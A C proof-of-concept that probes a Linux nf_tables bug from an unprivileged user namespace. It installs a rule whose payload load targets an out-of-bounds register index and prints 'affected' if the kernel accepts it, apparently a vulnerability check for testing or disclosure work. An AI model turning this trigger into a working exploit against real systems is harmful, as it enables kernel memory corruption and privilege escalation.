/* cc poc_reg_oob.c -o nft_test -lnftnl -lmnl && unshare -U -n -r /bin/sh -c './nft_test ; /sbin/nft list ruleset'
 *
 * Attempts to install:
 * [ immediate reg 1 0x00000000 ]
 * [ cmp neq reg 1 0x00000000 ]
 * [ payload load 64b @ network header + 0 => reg 61 ]	# won't do anything due to cmp 0 != 0 above.
 */

#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

int main(void)
{
	static const uint32_t zero;
	struct mnl_socket *nl;
	struct nftnl_table *table = nftnl_table_alloc();
	struct nftnl_chain *chain = nftnl_chain_alloc();
	struct nftnl_rule *rule = nftnl_rule_alloc();
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nftnl_expr *expr_cmp, *expr_payload, *expr_imm;
	struct mnl_nlmsg_batch *batch;
	struct nlmsghdr *nlh;
	int seq = 0, ret;

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (!nl) {
		perror("mnl_socket_open");
		return 1;
	}

	nftnl_table_set_str(table, NFTNL_TABLE_NAME, "test_oob_register");

	nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, "test_oob_register");
	nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, "c");
	nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_INET_PRE_ROUTING);
	nftnl_chain_set_str(chain, NFTNL_CHAIN_TYPE, "filter");

	nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, "test_oob_register");
	nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, "c");

	expr_imm = nftnl_expr_alloc("immediate");
	nftnl_expr_set_u32(expr_imm, NFTNL_EXPR_IMM_DREG, NFT_REG_1);
        nftnl_expr_set(expr_imm, NFTNL_EXPR_IMM_DATA, &zero, sizeof(zero));
	nftnl_rule_add_expr(rule, expr_imm);

	expr_cmp = nftnl_expr_alloc("cmp");
	nftnl_expr_set_u32(expr_cmp, NFTNL_EXPR_CMP_SREG, NFT_REG_1);
        nftnl_expr_set_u32(expr_cmp, NFTNL_EXPR_CMP_OP, NFT_CMP_NEQ);
        nftnl_expr_set(expr_cmp, NFTNL_EXPR_CMP_DATA, &zero, sizeof(zero));
	nftnl_rule_add_expr(rule, expr_cmp);

	expr_payload = nftnl_expr_alloc("payload");
	nftnl_expr_set_u32(expr_payload, NFTNL_EXPR_PAYLOAD_DREG, 0xfffffff8);
	nftnl_expr_set_u32(expr_payload, NFTNL_EXPR_PAYLOAD_BASE, NFT_PAYLOAD_NETWORK_HEADER);
	nftnl_expr_set_u32(expr_payload, NFTNL_EXPR_PAYLOAD_LEN, 64);
	nftnl_expr_set_u32(expr_payload, NFTNL_EXPR_PAYLOAD_OFFSET, 0);
	nftnl_rule_add_expr(rule, expr_payload);

	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, 0, seq++);
	nftnl_table_nlmsg_build_payload(nlh, table);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_CREATE, seq++);
	nftnl_chain_nlmsg_build_payload(nlh, chain);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_CREATE|NLM_F_APPEND|NLM_F_ACK, seq++);
	nftnl_rule_nlmsg_build_payload(nlh, rule);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
	if (ret < 0) {
		perror("mnl_socket_sendto");
		return 1;
	}

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	if (ret < 0) {
		perror("mnl_socket_recvfrom");
		return 1;
	}

        ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl), NULL, NULL);
        if (ret < 0) {
                perror("mnl_cb_run");
		return 1;
        }

	fprintf(stderr, "affected: mnl_cb_run returned %d\n", ret);
	mnl_socket_close(nl);
	return 0;
}
